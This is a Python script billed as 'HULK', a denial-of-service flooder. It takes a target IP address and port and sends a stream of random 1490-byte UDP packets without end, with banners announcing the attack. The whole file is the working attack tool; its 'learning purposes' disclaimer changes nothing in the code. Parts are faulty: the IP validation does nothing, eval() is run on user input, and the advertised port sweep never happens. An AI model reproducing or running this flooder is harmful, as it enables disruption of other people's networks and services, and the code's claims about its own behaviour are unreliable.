#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")

# Modified banner with more visually appealing design
print('''
    ╔════════════════════════════════════════════════╗
    ║            _  _ _   _ _    _  __              ║
    ║           | || | | | | |  | |/ /              ║ 
    ║           | __ | |_| | |__| ' <               ║
    ║           |_||_|\___/|____|_|\_\              ║
    ║                                               ║
    ║          HTTP Unbearable Load King            ║
    ║          Author: Chayan Kumawat               ║
    ║                                               ║
    ╚════════════════════════════════════════════════╝
    ╔════════════════════════════════════════════════╗
    ║                 DISCLAIMER                     ║    
    ║  • Don't Use For Personal Revenges            ║
    ║  • Author Is Not Responsible For Your Jobs    ║
    ║  • Use for learning purposes                  ║ 
    ║  • Does HULK suit in villain role, huh?       ║
    ╚════════════════════════════════════════════════╝
''')

# Modified input prompts
ip = input("\n 💻 Target IP Address ➜ ")
port = eval(input(" 🔌 Starting Port Number ➜ "))

os.system("clear")

# Modified validation messages
try:
    validate = ip
    print("\n ✅ IP Address Validated Successfully")
    print(" 🚀 Initializing Attack Sequence...")
except ValidationError as exception:
    print("\n ❌ Error: Invalid IP Address Format")

# Modified attack messages
print("\n" + "="*50)
print("         🦹 HULK SMASH MODE ACTIVATED 🦹")
print("="*50 + "\n")
print(" 🎯 Target Acquired: " + ip)
print(" ⚡ Port Range: " + str(port) + " - 65534\n")
time.sleep(5)

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print(f" 💥 Packet #{sent:,} launched at {ip}:{port}", end='\r')
        if port == 65534:
            port = 1
except KeyboardInterrupt:
    print("\n\n ⚠️  Attack Interrupted by User")
    print(" 🛑 DDOS Attack Terminated\n")

input(" 🔚 Press Enter to Exit")
os.system("clear")
print("\n 😴 Dr. Banner needs a nap...\n")
